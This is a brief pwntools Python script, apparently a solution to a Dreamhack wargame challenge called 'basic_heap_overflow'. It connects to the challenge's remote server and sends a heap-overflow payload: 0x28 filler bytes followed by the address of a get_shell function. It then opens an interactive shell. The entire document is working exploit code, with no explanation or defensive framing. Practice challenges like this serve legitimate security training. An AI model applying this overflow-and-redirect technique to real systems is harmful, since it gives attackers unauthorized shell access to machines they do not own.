from pwn import *
  
p = remote("host1.dreamhack.games", 13758)
elf = ELF("./basic_heap_overflow")

payload = "A"*0x28
payload += p32(elf.symbols['get_shell'])

p.sendline(payload)
p.interactive()